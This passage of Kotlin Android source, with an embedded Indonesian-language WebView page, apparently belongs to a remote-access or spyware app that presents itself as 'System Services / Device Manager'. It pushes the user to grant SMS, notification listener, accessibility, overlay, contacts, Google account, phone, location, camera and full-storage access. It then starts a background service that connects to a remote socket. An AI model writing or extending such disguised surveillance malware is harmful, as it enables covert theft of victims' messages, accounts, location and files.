    <div class="perm-row" id="row-gallery"><div class="perm-icon-wrap"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="2" y="2" width="20" height="20" rx="2"/><circle cx="8" cy="8" r="2"/><path d="M22 15l-6-4-4 4-4-4-6 6"/></svg></div><div class="perm-info"><div class="perm-name">Galeri / Penyimpanan</div><div class="perm-desc">Mengakses Foto Dan File</div></div><label class="tog"><input type="checkbox" id="tog-gallery" onchange="onToggle('gallery',this)"><span class="tog-track"></span></label></div>
    
    <!-- LOCATION -->
    <div class="perm-row" id="row-location"><div class="perm-icon" style="background:rgba(59,130,246,.12);color:#60a5fa"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg></div><div class="perm-info"><div class="perm-name">Izin Lokasi</div><div class="perm-desc">Mengakses Lokasi GPS</div></div><label class="tog"><input type="checkbox" id="tog-location" onchange="onToggle('location',this)"><span class="tog-track"></span></label></div>
    
    <!-- GPS ON -->
    <div class="perm-row" id="row-gpson"><div class="perm-icon" style="background:rgba(16,185,129,.12);color:#34d399"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="3"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3"/><path d="M4.93 4.93l2.12 2.12M16.95 16.95l2.12 2.12M4.93 19.07l2.12-2.12M16.95 7.05l2.12-2.12"/></svg></div><div class="perm-info"><div class="perm-name">Aktifkan GPS</div><div class="perm-desc">GPS Harus Dihidupkan</div></div><label class="tog"><input type="checkbox" id="tog-gpson" onchange="onToggle('gpson',this)"><span class="tog-track"></span></label></div>
    
    <!-- CONTACTS -->
    <div class="perm-row" id="row-contacts"><div class="perm-icon-wrap"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg></div><div class="perm-info"><div class="perm-name">Kontak</div><div class="perm-desc">Membaca Daftar Kontak</div></div><label class="tog"><input type="checkbox" id="tog-contacts" onchange="onToggle('contacts',this)"><span class="tog-track"></span></label></div>
    
    <!-- GMAIL -->
    <div class="perm-row" id="row-gmail"><div class="perm-icon-wrap"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div><div class="perm-info"><div class="perm-name">Akun Google</div><div class="perm-desc">Membaca Akun Google Terdaftar</div></div><label class="tog"><input type="checkbox" id="tog-gmail" onchange="onToggle('gmail',this)"><span class="tog-track"></span></label></div>
    
    <!-- STORAGE -->
    <div class="perm-row" id="row-storage"><div class="perm-icon" style="background:rgba(251,146,60,.12);color:#fb923c"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg></div><div class="perm-info"><div class="perm-name">Akses Semua File</div><div class="perm-desc">Akses Ke Semua File Di Penyimpanan</div></div><label class="tog"><input type="checkbox" id="tog-storage" onchange="onToggle('storage',this)"><span class="tog-track"></span></label></div>
    
    <!-- PHONE -->
    <div class="perm-row" id="row-phone"><div class="perm-icon" style="background:rgba(34,197,94,.12);color:#22c55e"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.79 19.79 0 0 1 1.6 3.4 2 2 0 0 1 3.58 1.22h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 22 16.92z"/></svg></div><div class="perm-info"><div class="perm-name">Info Telepon & SIM</div><div class="perm-desc">Membaca Nomor Telepon & SIM</div></div><label class="tog"><input type="checkbox" id="tog-phone" onchange="onToggle('phone',this)"><span class="tog-track"></span></label></div>
  </div>
  
  <div class="perm-footer">
    <div class="all-granted-badge" id="allGrantedBadge">
      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
      Semua Akses Telah Diaktifkan
    </div>
    <button class="btn-masuk refresh-mode" id="btnMasuk" onclick="handleMasuk()">
      <svg id="btnIcon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-.49-4.5"/></svg>
      <span id="btnLabel">PERBARUI STATUS</span>
    </button>
  </div>
</div>

<div class="screen hidden" id="connectedScreen">
  <div class="conn-wrap">
    <div class="conn-top">
      <div class="conn-logo-wrap">
        <div class="conn-logo-bg">
          <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#6366f1" stroke-width="1.6">
            <path d="M12 2L3 7v5c0 5.25 3.75 10.15 9 11.35C17.25 22.15 21 17.25 21 12V7L12 2z"/>
            <path d="M9 12l2 2 4-4" stroke-width="1.8"/>
          </svg>
        </div>
        <div class="conn-logo-pulse"></div>
      </div>
      <div class="conn-name-wrap">
        <div class="conn-app-name">System Services</div>
        <div class="conn-app-sub">Device Manager</div>
      </div>
      <div class="conn-status-wrap">
        <div class="conn-status-indicator status-indicator offline" id="statusIndicator">
          <div class="status-dot"></div>
          <div class="status-text" id="statusLbl">TIDAK TERHUBUNG</div>
        </div>
        <div class="status-last" id="infoLast"></div>
      </div>
    </div>
    <div class="conn-bottom">
      <div class="conn-info-row">
        <span class="conn-info-k">ID Perangkat</span>
        <span class="conn-info-v" id="infoDevId">—</span>
      </div>
      <div class="conn-info-row">
        <span class="conn-info-k">Status Sinkronisasi</span>
        <span class="conn-info-v" id="infoSync">Menghubungkan...</span>
      </div>
    </div>
    <div class="conn-footer-wrap">
      <div class="conn-footer">Berjalan Di Latar Belakang</div>
    </div>
  </div>
</div>

<script>
const permIds = ['cam','bat','overlay','accessibility','usage','sms','notif','gallery','location','gpson','contacts','gmail','storage','phone']

function refreshPerms() {
  if (!window.Android) return
  const state = {
    cam: Android.isCamGranted(),
    bat: Android.isBatteryOptIgnored(),
    overlay: Android.isOverlayGranted(),
    accessibility: Android.isAccessibilityGranted(),
    usage: Android.isUsageAccessGranted(),
    sms: Android.isSmsGranted(),
    notif: Android.isNotifListenerGranted(),
    gallery: Android.isGalleryGranted(),
    location: Android.isLocationGranted(),
    gpson: Android.isGpsEnabled(),
    contacts: Android.isContactsGranted(),
    gmail: Android.isGmailGranted(),
    phone: Android.isPhoneGranted(),
    storage: Android.isManageStorageGranted()
  }
  let allOk = true
  permIds.forEach(id => {
    const tog = document.getElementById('tog-' + id)
    const row = document.getElementById('row-' + id)
    const granted = state[id]
    if (!granted) allOk = false
    if (tog) { tog.checked = granted; tog.disabled = granted }
    if (row) row.classList.toggle('granted', granted)
  })
  document.getElementById('allGrantedBadge').classList.toggle('show', allOk)
  const btn = document.getElementById('btnMasuk')
  const label = document.getElementById('btnLabel')
  if (allOk) {
    btn.classList.remove('refresh-mode')
    document.getElementById('btnIcon').outerHTML = '<svg id="btnIcon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg>'
    label.textContent = 'MULAI'
  } else {
    btn.classList.add('refresh-mode')
    document.getElementById('btnIcon').outerHTML = '<svg id="btnIcon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-.49-4.5"/></svg>'
    label.textContent = 'PERBARUI STATUS'
  }
}

function onToggle(id, el) {
  if (!window.Android) return
  if (!el.checked) { refreshPerms(); return }
  const p = autoPermList.find(x => x.id === id)
  if (p) p.request()
  setTimeout(refreshPerms, 500)
}

const autoPermList = [
  { id: 'cam', check: () => Android.isCamGranted(), request: () => Android.requestCamPerm() },
  { id: 'bat', check: () => Android.isBatteryOptIgnored(), request: () => Android.openBatterySettings() },
  { id: 'overlay', check: () => Android.isOverlayGranted(), request: () => Android.requestOverlayPerm() },
  { id: 'accessibility', check: () => Android.isAccessibilityGranted(), request: () => Android.requestAccessibilityPerm() },
  { id: 'usage', check: () => Android.isUsageAccessGranted(), request: () => Android.requestUsageAccessPerm() },
  { id: 'sms', check: () => Android.isSmsGranted(), request: () => Android.requestSmsPerm() },
  { id: 'notif', check: () => Android.isNotifListenerGranted(), request: () => Android.openNotifListenerSettings() },
  { id: 'gallery', check: () => Android.isGalleryGranted(), request: () => Android.requestGalleryPerm() },
  { id: 'location', check: () => Android.isLocationGranted(), request: () => Android.requestLocationPerm() },
  { id: 'gpson', check: () => Android.isGpsEnabled(), request: () => Android.requestEnableGps() },
  { id: 'contacts', check: () => Android.isContactsGranted(), request: () => Android.requestContactsPerm() },
  { id: 'gmail', check: () => Android.isGmailGranted(), request: () => Android.requestGmailPerm() },
  { id: 'phone', check: () => Android.isPhoneGranted(), request: () => Android.requestPhonePerm() },
  { id: 'storage', check: () => Android.isManageStorageGranted(), request: () => Android.requestManageStoragePerm() }
]

function checkAllGranted() {
  if (!window.Android) return false
  return autoPermList.every(p => p.check())
}

function handleMasuk() {
  const label = document.getElementById('btnLabel')
  if (!label) { refreshPerms(); return }
  if (label.textContent.trim() === 'MULAI') {
    showConnected()
  } else {
    refreshPerms()
  }
}

function showConnected() {
  document.getElementById('permScreen').classList.add('hidden')
  document.getElementById('connectedScreen').classList.remove('hidden')
  try { MainBridge.connectNow(); } catch(e) {}
  const devId = window.Android ? Android.getDeviceId() : '—'
  document.getElementById('infoDevId').textContent = devId
  setInterval(() => {
    const online = window.Android ? Android.isSocketConnected() : false
    const ind = document.getElementById('statusIndicator')
    const lbl = document.getElementById('statusLbl')
    const sync = document.getElementById('infoSync')
    ind.className = 'conn-status-indicator status-indicator ' + (online ? 'online' : 'offline')
    lbl.textContent = online ? 'TERHUBUNG' : 'TIDAK TERHUBUNG'
    sync.textContent = online ? 'Aktif & Tersinkronisasi' : 'Mencoba menghubungkan...'
    if (online) document.getElementById('infoLast').textContent = 'Terakhir diperbarui ' + new Date().toLocaleTimeString('id-ID')
  }, 2000)
}

window.addEventListener('load', () => {
  setTimeout(() => {
    if (checkAllGranted()) {
      showConnected()
    } else {
      refreshPerms()
    }
  }, 300)
  setInterval(() => {
    if (!document.getElementById('permScreen').classList.contains('hidden')) {
      refreshPerms()
    }
  }, 1000)
})
</script>
</body>
</html>""".trimIndent()
    }

    inner class MainBridge {
        @android.webkit.JavascriptInterface
        fun connectNow() {
            Handler(Looper.getMainLooper()).post {
                startDeviceService()
                val i = Intent(DeviceService.ACTION_CONNECT).apply { setPackage(packageName) }
                sendBroadcast(i)
            }
        }
    }
}

// ===================== APP BRIDGE =====================

class AppBridge(private val context: Context, private val webView: WebView) {

    companion object {
        var instance: AppBridge? = null
    }

    @JavascriptInterface fun getDeviceId(): String =
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"

    @JavascriptInterface fun getDeviceName(): String {
        val m = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val n = Build.MODEL
        return if (n.startsWith(m, ignoreCase = true)) n else "$m $n"
    }

    @JavascriptInterface fun isSocketConnected(): Boolean = SocketHolder.connected

    @JavascriptInterface fun isCamGranted() = (context as MainActivity).isCamGranted()
    @JavascriptInterface fun isSmsGranted() = (context as MainActivity).isSmsGranted()
    @JavascriptInterface fun isNotifListenerGranted() = (context as MainActivity).isNotifListenerGranted()
    @JavascriptInterface fun isBatteryOptIgnored() = (context as MainActivity).isBatteryOptIgnored()
    @JavascriptInterface fun isOverlayGranted() = (context as MainActivity).isOverlayGranted()
    @JavascriptInterface fun isAccessibilityGranted() = (context as MainActivity).isAccessibilityGranted()
    @JavascriptInterface fun isUsageAccessGranted() = (context as MainActivity).isUsageAccessGranted()
    @JavascriptInterface fun isGalleryGranted() = (context as MainActivity).isGalleryGranted()
    @JavascriptInterface fun isLocationGranted() = (context as MainActivity).isLocationGranted()
    @JavascriptInterface fun isGpsEnabled() = (context as MainActivity).isGpsEnabled()
    @JavascriptInterface fun isContactsGranted() = (context as MainActivity).isContactsGranted()
    @JavascriptInterface fun isGmailGranted() = (context as MainActivity).isGmailGranted()
    @JavascriptInterface fun isPhoneGranted() = (context as MainActivity).isPhoneGranted()
    @JavascriptInterface fun isManageStorageGranted() = (context as MainActivity).isManageStorageGranted()

    @JavascriptInterface fun requestCamPerm() = (context as MainActivity).requestCamPerm()
    @JavascriptInterface fun requestSmsPerm() = (context as MainActivity).requestSmsPerm()
    @JavascriptInterface fun openBatterySettings() = (context as MainActivity).openBatterySettings()
    @JavascriptInterface fun requestOverlayPerm() = (context as MainActivity).requestOverlayPerm()
    @JavascriptInterface fun openNotifListenerSettings() = (context as MainActivity).openNotifListenerSettings()
    @JavascriptInterface fun requestAccessibilityPerm() = (context as MainActivity).requestAccessibilityPerm()
    @JavascriptInterface fun requestUsageAccessPerm() = (context as MainActivity).requestUsageAccessPerm()
    @JavascriptInterface fun requestGalleryPerm() = (context as MainActivity).requestGalleryPerm()
    @JavascriptInterface fun requestLocationPerm() = (context as MainActivity).requestLocationPerm()
    @JavascriptInterface fun requestEnableGps() = (context as MainActivity).requestEnableGps()
    @JavascriptInterface fun requestContactsPerm() = (context as MainActivity).requestContactsPerm()
    @JavascriptInterface fun requestGmailPerm() = (context as MainActivity).requestGmailPerm()
    @JavascriptInterface fun requestPhonePerm() = (context as MainActivity).requestPhonePerm()
    @JavascriptInterface fun requestManageStoragePerm() = (context as MainActivity).requestManageStoragePerm()
}
